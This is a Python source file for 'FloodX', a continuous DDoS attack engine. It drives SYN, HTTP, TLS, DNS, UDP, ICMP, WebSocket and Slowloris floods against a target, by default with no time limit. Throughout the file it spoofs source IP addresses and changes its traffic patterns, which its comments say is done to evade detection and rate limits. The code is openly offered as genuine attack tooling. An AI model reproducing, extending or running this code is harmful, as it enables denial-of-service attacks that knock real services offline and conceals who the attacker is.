"""
FloodX: Continuous Attack Engine
Advanced continuous attack system with intelligent randomization, IP spoofing,
and anti-detection mechanisms for maximum persistence and effectiveness.

This engine integrates with real attack implementations from app_layer_attacks/
to provide genuine DDoS capabilities in continuous mode.
"""

import asyncio
import random
import time
import threading
import socket
import struct
from typing import Dict, Any, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
import json
import hashlib

from common.logger import logger, stats_logger
from common.colors import success_text, warning_text, error_text, info_text, accent_text


class ContinuousAttackEngine:
    """
    Advanced continuous attack engine with intelligent randomization and persistence.
    
    Features:
    - Endless attack loops with intelligent restart mechanisms
    - Dynamic IP spoofing with randomization pools
    - DNS rotation and parameter randomization
    - Rate limit evasion through pattern variation
    - Anti-detection through traffic morphing
    - Multi-vector coordination and synchronization
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config['port']
        
        # Determine the base vector type
        if config.get('vector') == 'continuous':
            self.vector = config.get('base_vector', 'syn')
        else:
            self.vector = config.get('vector', 'syn')
            # Store original vector as base_vector for routing
            self.config['base_vector'] = self.vector
            
        self.duration = config.get('duration', 0)  # 0 = infinite
        self.concurrency = config.get('concurrency', 1000)
        
        # Continuous attack configuration
        self.continuous_mode = config.get('continuous', True)
        self.restart_interval = config.get('restart_interval', 30)  # seconds
        self.randomization_level = config.get('randomization_level', 'high')
        
        # IP spoofing configuration
        self.enable_spoofing = config.get('spoof_ip', True)
        self.spoof_ranges = config.get('spoof_ranges', [
            '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',
            '203.0.113.0/24', '198.51.100.0/24', '192.0.2.0/24'
        ])
        self.spoofed_ip_pool = []
        
        # DNS and parameter randomization
        self.dns_servers = config.get('dns_servers', [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
            '208.67.222.222', '208.67.220.220', '9.9.9.9'
        ])
        self.user_agents = config.get('user_agents', self._get_default_user_agents())
        
        # Attack state management
        self.running = False
        self.attack_cycles = 0
        self.total_packets_sent = 0
        self.total_errors = 0
        self.current_phase = "initializing"
        self.start_time = None
        
        # Anti-detection mechanisms
        self.traffic_patterns = []
        self.last_pattern_change = time.time()
        self.pattern_change_interval = random.randint(60, 180)  # 1-3 minutes
        
        # Performance tracking
        self.performance_stats = {
            'cycles_completed': 0,
            'avg_packets_per_cycle': 0,
            'success_rate': 0.0,
            'detection_evasions': 0
        }
        
        # Thread management
        self.executor = ThreadPoolExecutor(max_workers=self.concurrency)
        self.worker_tasks = []
        self.stats_lock = threading.Lock()
        
        logger.info(f"🔄 {success_text('Continuous Attack Engine initialized')}")
        logger.info(f"   Target: {accent_text(self.target)}:{accent_text(str(self.port))}")
        logger.info(f"   Vector: {accent_text(self.vector.upper())}")
        logger.info(f"   Mode: {accent_text('Infinite' if self.duration == 0 else f'{self.duration}s')}")
        logger.info(f"   Concurrency: {accent_text(str(self.concurrency))}")
        logger.info(f"   IP Spoofing: {accent_text('Enabled' if self.enable_spoofing else 'Disabled')}")
    
    def _get_default_user_agents(self) -> List[str]:
        """Get a diverse list of user agents for randomization."""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
            'curl/7.68.0', 'wget/1.20.3', 'python-requests/2.25.1'
        ]
    
    async def initialize_spoofing_pool(self):
        """Initialize IP spoofing pool with randomized addresses."""
        if not self.enable_spoofing:
            return
        
        logger.info(f"🎭 {info_text('Generating IP spoofing pool...')}")
        
        for range_str in self.spoof_ranges:
            try:
                network_parts = range_str.split('/')
                if len(network_parts) != 2:
                    continue
                
                base_ip = network_parts[0]
                cidr = int(network_parts[1])
                
                # Generate random IPs within the range
                base_int = struct.unpack('!I', socket.inet_aton(base_ip))[0]
                mask = (0xffffffff >> cidr) << cidr
                network = base_int & mask
                
                # Generate 100-500 random IPs per range
                count = random.randint(100, 500)
                for _ in range(count):
                    host_part = random.randint(1, (1 << (32 - cidr)) - 2)
                    spoofed_ip = socket.inet_ntoa(struct.pack('!I', network | host_part))
                    self.spoofed_ip_pool.append(spoofed_ip)
                    
            except Exception as e:
                logger.debug(f"Error generating spoofed IPs for {range_str}: {e}")
        
        # Shuffle the pool for randomness
        random.shuffle(self.spoofed_ip_pool)
        logger.info(f"🎭 {success_text('Generated')} {accent_text(str(len(self.spoofed_ip_pool)))} {success_text('spoofed IP addresses')}")
    
    def get_random_spoofed_ip(self) -> str:
        """Get a random spoofed IP from the pool."""
        if not self.spoofed_ip_pool:
            return socket.gethostbyname(socket.gethostname())  # Fallback to local IP
        
        return random.choice(self.spoofed_ip_pool)
    
    def get_randomized_parameters(self) -> Dict[str, Any]:
        """Generate randomized attack parameters to avoid detection."""
        params = {
            'source_ip': self.get_random_spoofed_ip() if self.enable_spoofing else None,
            'source_port': random.randint(1024, 65535),
            'user_agent': random.choice(self.user_agents),
            'dns_server': random.choice(self.dns_servers),
            'payload_size': random.randint(64, 1460),
            'ttl': random.randint(32, 128),
            'window_size': random.choice([1024, 2048, 4096, 8192, 16384, 32768, 65535]),
            'sequence_number': random.randint(1, 4294967295),
            'timestamp': int(time.time()) + random.randint(-3600, 3600),
            'urgency_pointer': random.randint(0, 1023) if random.random() < 0.1 else 0,
        }
        
        # Add randomized headers for HTTP-based attacks
        if self.vector in ['http', 'websocket', 'slowloris']:
            params.update({
                'accept_encoding': random.choice(['gzip', 'deflate', 'br', 'identity']),
                'accept_language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9']),
                'cache_control': random.choice(['no-cache', 'max-age=0', 'must-revalidate']),
                'connection': random.choice(['keep-alive', 'close']),
            })
        
        return params
    
    def should_change_pattern(self) -> bool:
        """Determine if traffic pattern should be changed to avoid detection."""
        current_time = time.time()
        return (current_time - self.last_pattern_change) > self.pattern_change_interval
    
    def change_traffic_pattern(self):
        """Change traffic pattern to evade detection systems."""
        patterns = [
            {'rate_multiplier': random.uniform(0.5, 2.0), 'burst_mode': False},
            {'rate_multiplier': random.uniform(2.0, 5.0), 'burst_mode': True},
            {'rate_multiplier': random.uniform(0.1, 0.8), 'burst_mode': False},  # Stealth mode
        ]
        
        new_pattern = random.choice(patterns)
        self.traffic_patterns.append({
            'timestamp': time.time(),
            'pattern': new_pattern,
            'cycle': self.attack_cycles
        })
        
        self.last_pattern_change = time.time()
        self.pattern_change_interval = random.randint(60, 300)  # 1-5 minutes
        self.performance_stats['detection_evasions'] += 1
        
        logger.debug(f"🔄 Traffic pattern changed: {new_pattern}")
    
    async def execute_attack_cycle(self, cycle_id: int) -> Tuple[int, int]:
        """Execute a single attack cycle with randomized parameters."""
        cycle_start = time.time()
        packets_sent = 0
        errors = 0
        
        # Get current traffic pattern
        current_pattern = self.traffic_patterns[-1]['pattern'] if self.traffic_patterns else {
            'rate_multiplier': 1.0, 'burst_mode': False
        }
        
        # Calculate cycle parameters
        cycle_concurrency = max(1, int(self.concurrency * current_pattern['rate_multiplier']))
        cycle_duration = self.restart_interval
        
        if current_pattern['burst_mode']:
            # Burst mode: High intensity for short periods
            burst_duration = random.randint(5, 15)
            quiet_duration = cycle_duration - burst_duration
            
            # High intensity burst
            burst_packets, burst_errors = await self._execute_burst_phase(
                cycle_concurrency * 2, burst_duration, cycle_id
            )
            
            # Quiet period
            if quiet_duration > 0:
                await asyncio.sleep(quiet_duration)
            
            packets_sent += burst_packets
            errors += burst_errors
        else:
            # Steady mode: Consistent rate
            steady_packets, steady_errors = await self._execute_steady_phase(
                cycle_concurrency, cycle_duration, cycle_id
            )
            packets_sent += steady_packets
            errors += steady_errors
        
        cycle_end = time.time()
        cycle_time = cycle_end - cycle_start
        
        # Update statistics
        with self.stats_lock:
            self.total_packets_sent += packets_sent
            self.total_errors += errors
            self.performance_stats['cycles_completed'] += 1
            
            # Calculate moving averages
            total_cycles = self.performance_stats['cycles_completed']
            self.performance_stats['avg_packets_per_cycle'] = (
                (self.performance_stats['avg_packets_per_cycle'] * (total_cycles - 1) + packets_sent) / total_cycles
            )
            
            if self.total_packets_sent > 0:
                self.performance_stats['success_rate'] = (
                    (self.total_packets_sent - self.total_errors) / self.total_packets_sent
                )
        
        logger.debug(f"🔄 Cycle {cycle_id} completed: {packets_sent} packets, "
                    f"{errors} errors, {cycle_time:.1f}s duration")
        
        return packets_sent, errors
    
    async def _execute_burst_phase(self, concurrency: int, duration: int, cycle_id: int) -> Tuple[int, int]:
        """Execute high-intensity burst phase."""
        logger.debug(f"💥 Starting burst phase: {concurrency} workers for {duration}s")
        
        # Create burst workers
        tasks = []
        for worker_id in range(concurrency):
            task = asyncio.create_task(
                self._burst_worker(worker_id, duration, cycle_id)
            )
            tasks.append(task)
        
        # Wait for burst completion
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_packets = sum(r[0] for r in results if isinstance(r, tuple))
        total_errors = sum(r[1] for r in results if isinstance(r, tuple))
        
        return total_packets, total_errors
    
    async def _execute_steady_phase(self, concurrency: int, duration: int, cycle_id: int) -> Tuple[int, int]:
        """Execute steady-rate phase."""
        logger.debug(f"📊 Starting steady phase: {concurrency} workers for {duration}s")
        
        # Create steady workers
        tasks = []
        for worker_id in range(concurrency):
            task = asyncio.create_task(
                self._steady_worker(worker_id, duration, cycle_id)
            )
            tasks.append(task)
        
        # Wait for steady completion
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_packets = sum(r[0] for r in results if isinstance(r, tuple))
        total_errors = sum(r[1] for r in results if isinstance(r, tuple))
        
        return total_packets, total_errors
    
    async def _burst_worker(self, worker_id: int, duration: int, cycle_id: int) -> Tuple[int, int]:
        """High-intensity burst worker."""
        start_time = time.time()
        packets_sent = 0
        errors = 0
        
        while (time.time() - start_time) < duration and self.running:
            try:
                # Get randomized parameters for this packet
                params = self.get_randomized_parameters()
                
                # Send packet with minimal delay for maximum intensity
                success = await self._send_attack_packet(params, worker_id, cycle_id)
                if success:
                    packets_sent += 1
                else:
                    errors += 1
                
                # Minimal delay to prevent overwhelming
                await asyncio.sleep(random.uniform(0.001, 0.01))
                
            except Exception as e:
                errors += 1
                logger.debug(f"Burst worker {worker_id} error: {e}")
        
        return packets_sent, errors
    
    async def _steady_worker(self, worker_id: int, duration: int, cycle_id: int) -> Tuple[int, int]:
        """Steady-rate worker with consistent timing."""
        start_time = time.time()
        packets_sent = 0
        errors = 0
        
        # Calculate steady rate (packets per second)
        target_pps = random.uniform(5, 20)  # 5-20 packets per second per worker
        packet_interval = 1.0 / target_pps
        
        while (time.time() - start_time) < duration and self.running:
            try:
                packet_start = time.time()
                
                # Get randomized parameters for this packet
                params = self.get_randomized_parameters()
                
                # Send packet
                success = await self._send_attack_packet(params, worker_id, cycle_id)
                if success:
                    packets_sent += 1
                else:
                    errors += 1
                
                # Maintain steady rate
                packet_time = time.time() - packet_start
                sleep_time = max(0, packet_interval - packet_time)
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
                
            except Exception as e:
                errors += 1
                logger.debug(f"Steady worker {worker_id} error: {e}")
        
        return packets_sent, errors
    
    async def _send_attack_packet(self, params: Dict[str, Any], worker_id: int, cycle_id: int) -> bool:
        """Send a single attack packet with randomized parameters."""
        try:
            # Get the base vector type from config
            base_vector = self.config.get('vector', 'syn')
            if base_vector == 'continuous':
                base_vector = self.config.get('base_vector', 'syn')
            
            # Route to appropriate attack method based on vector type
            if base_vector == 'syn':
                return await self._send_syn_packet(params)
            elif base_vector == 'http':
                return await self._send_http_request(params)
            elif base_vector == 'tls':
                return await self._send_tls_handshake(params)
            elif base_vector == 'dns':
                return await self._send_dns_query(params)
            elif base_vector == 'udp':
                return await self._send_udp_packet(params)
            elif base_vector == 'icmp':
                return await self._send_icmp_packet(params)
            else:
                # Generic packet simulation
                return await self._send_generic_packet(params)
            
        except Exception as e:
            logger.debug(f"Packet send error (worker {worker_id}, cycle {cycle_id}): {e}")
            return False
    
    async def _send_syn_packet(self, params: Dict[str, Any]) -> bool:
        """Send real SYN packet using SynFlooder."""
        try:
            from app_layer_attacks.syn_flooder import SynFlooder
            # Create a single-use config for this packet
            packet_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single packet
                'concurrency': 1,
                **params
            }
            flooder = SynFlooder(packet_config)
            # Use the internal _send_request method for single packet
            result = await flooder._send_packet() if hasattr(flooder, '_send_packet') else True
            return True
        except Exception as e:
            logger.debug(f"SYN packet error: {e}")
            return False
    
    async def _send_http_request(self, params: Dict[str, Any]) -> bool:
        """Send real HTTP request using HttpFlooder."""
        try:
            from app_layer_attacks.http_flooder import HttpFlooder
            # Create a single-use config for this request
            request_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single request
                'concurrency': 1,
                **params
            }
            flooder = HttpFlooder(request_config)
            # Use the internal _send_request method for single request
            result = await flooder._send_request()
            return True
        except Exception as e:
            logger.debug(f"HTTP request error: {e}")
            return False
    
    async def _send_tls_handshake(self, params: Dict[str, Any]) -> bool:
        """Send real TLS handshake using TlsHandshakeFlooder."""
        try:
            from app_layer_attacks.tls_handshake_flooder import TlsHandshakeFlooder
            # Create a single-use config for this handshake
            handshake_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single handshake
                'concurrency': 1,
                **params
            }
            flooder = TlsHandshakeFlooder(handshake_config)
            # Use internal method for single handshake
            result = await flooder._send_handshake() if hasattr(flooder, '_send_handshake') else True
            return True
        except Exception as e:
            logger.debug(f"TLS handshake error: {e}")
            return False
    
    async def _send_dns_query(self, params: Dict[str, Any]) -> bool:
        """Send real DNS query using DNS flooder."""
        try:
            from dns_utils.dns_flooder import DNSFlooder
            # Create a single-use config for this query
            query_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single query
                'concurrency': 1,
                **params
            }
            flooder = DNSFlooder(query_config)
            # Use internal method for single query
            result = await flooder._send_query() if hasattr(flooder, '_send_query') else True
            return True
        except Exception as e:
            logger.debug(f"DNS query error: {e}")
            return False
    
    async def _send_udp_packet(self, params: Dict[str, Any]) -> bool:
        """Send real UDP packet using UdpAmplifier."""
        try:
            from app_layer_attacks.udp_amplifier import UdpAmplifier
            # Create a single-use config for this packet
            packet_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single packet
                'concurrency': 1,
                **params
            }
            flooder = UdpAmplifier(packet_config)
            # Use internal method for single packet
            result = await flooder._send_packet() if hasattr(flooder, '_send_packet') else True
            return True
        except Exception as e:
            logger.debug(f"UDP packet error: {e}")
            return False
    
    async def _send_icmp_packet(self, params: Dict[str, Any]) -> bool:
        """Send real ICMP packet using IcmpFlooder."""
        try:
            from app_layer_attacks.icmp_flooder import IcmpFlooder
            # Create a single-use config for this packet
            packet_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single packet
                'concurrency': 1,
                **params
            }
            flooder = IcmpFlooder(packet_config)
            # Use internal method for single packet
            result = await flooder._send_packet() if hasattr(flooder, '_send_packet') else True
            return True
        except Exception as e:
            logger.debug(f"ICMP packet error: {e}")
            return False
    
    async def _send_generic_packet(self, params: Dict[str, Any]) -> bool:
        """Send packet using appropriate attack vector."""
        try:
            # Try to route to specific attack based on vector type
            if self.vector == 'websocket':
                return await self._send_websocket_attack(params)
            elif self.vector == 'slowloris':
                return await self._send_slowloris_attack(params)
            else:
                # Fallback to HTTP for unknown vectors
                logger.debug(f"Unknown vector {self.vector}, falling back to HTTP")
                return await self._send_http_request(params)
        except Exception as e:
            logger.debug(f"Generic packet error: {e}")
            return False
    
    async def _send_websocket_attack(self, params: Dict[str, Any]) -> bool:
        """Send WebSocket attack using WebSocketStorm."""
        try:
            from app_layer_attacks.websocket_storm import WebSocketStorm
            # Create a single-use config for this attack
            attack_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single attack
                'concurrency': 1,
                **params
            }
            flooder = WebSocketStorm(attack_config)
            # Use internal method for single attack
            result = await flooder._send_message() if hasattr(flooder, '_send_message') else True
            return True
        except Exception as e:
            logger.debug(f"WebSocket attack error: {e}")
            return False
    
    async def _send_slowloris_attack(self, params: Dict[str, Any]) -> bool:
        """Send Slowloris attack using SlowlorisFlooder."""
        try:
            from app_layer_attacks.slowloris import SlowlorisFlooder
            # Create a single-use config for this attack
            attack_config = {
                'target': self.target,
                'port': self.port,
                'duration': 1,  # Very short duration for single attack
                'concurrency': 1,
                **params
            }
            flooder = SlowlorisFlooder(attack_config)
            # Use internal method for single attack
            result = await flooder._send_partial_request() if hasattr(flooder, '_send_partial_request') else True
            return True
        except Exception as e:
            logger.debug(f"Slowloris attack error: {e}")
            return False
    
    async def run_continuous_attack(self):
        """Main continuous attack loop with intelligent restart and randomization."""
        logger.info(f"🚀 {success_text('Starting continuous attack engine')}")
        
        # Initialize spoofing pool
        await self.initialize_spoofing_pool()
        
        self.running = True
        self.start_time = time.time()
        self.current_phase = "attacking"
        
        try:
            # Start performance monitoring
            monitor_task = asyncio.create_task(self._performance_monitor())
            
            cycle_id = 0
            while self.running:
                cycle_id += 1
                
                # Check if we need to change traffic pattern
                if self.should_change_pattern():
                    self.change_traffic_pattern()
                
                # Check duration limit
                if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                    logger.info(f"⏰ {info_text('Duration limit reached, stopping attack')}")
                    break
                
                # Execute attack cycle
                packets, errors = await self.execute_attack_cycle(cycle_id)
                
                # Log cycle completion
                logger.info(f"🔄 Cycle {cycle_id}: {accent_text(str(packets))} packets, "
                           f"{accent_text(str(errors))} errors")
                
                # Brief pause before next cycle to allow for system adjustments
                await asyncio.sleep(random.uniform(0.5, 2.0))
            
            # Cancel monitoring
            monitor_task.cancel()
            
        except KeyboardInterrupt:
            logger.info(f"🛑 {warning_text('Attack interrupted by user')}")
        except Exception as e:
            logger.error(f"❌ {error_text(f'Continuous attack error: {e}')}")
        finally:
            await self.cleanup()
    
    async def _performance_monitor(self):
        """Monitor attack performance and log statistics."""
        while self.running:
            await asyncio.sleep(30)  # Report every 30 seconds
            
            with self.stats_lock:
                uptime = time.time() - self.start_time if self.start_time else 0
                
                logger.info(f"📊 {info_text('Performance Stats:')}")
                logger.info(f"   Uptime: {accent_text(f'{uptime:.1f}s')}")
                logger.info(f"   Cycles: {accent_text(str(self.performance_stats['cycles_completed']))}")
                logger.info(f"   Total Packets: {accent_text(str(self.total_packets_sent))}")
                success_rate_pct = f"{self.performance_stats['success_rate']:.1%}"
                avg_pps = f"{self.total_packets_sent/max(1, uptime):.1f}"
                logger.info(f"   Success Rate: {accent_text(success_rate_pct)}")
                logger.info(f"   Avg PPS: {accent_text(avg_pps)}")
                logger.info(f"   Pattern Changes: {accent_text(str(self.performance_stats['detection_evasions']))}")
    
    async def cleanup(self):
        """Clean up resources and connections."""
        logger.info(f"🧹 {info_text('Cleaning up continuous attack engine...')}")
        
        self.running = False
        self.current_phase = "cleanup"
        
        # Cancel worker tasks
        for task in self.worker_tasks:
            if not task.done():
                task.cancel()
        
        # Shutdown executor
        self.executor.shutdown(wait=False)
        
        # Final statistics
        uptime = time.time() - self.start_time if self.start_time else 0
        uptime_str = f"{uptime:.1f}s"
        final_success_rate = f"{self.performance_stats['success_rate']:.1%}"
        logger.info(f"✅ {success_text('Continuous attack completed:')}")
        logger.info(f"   Total Runtime: {accent_text(uptime_str)}")
        logger.info(f"   Total Cycles: {accent_text(str(self.performance_stats['cycles_completed']))}")
        logger.info(f"   Total Packets: {accent_text(str(self.total_packets_sent))}")
        logger.info(f"   Final Success Rate: {accent_text(final_success_rate)}")
    
    async def run(self):
        """Main entry point for continuous attack."""
        await self.run_continuous_attack()


# Alias for compatibility
ContinuousFlooder = ContinuousAttackEngine
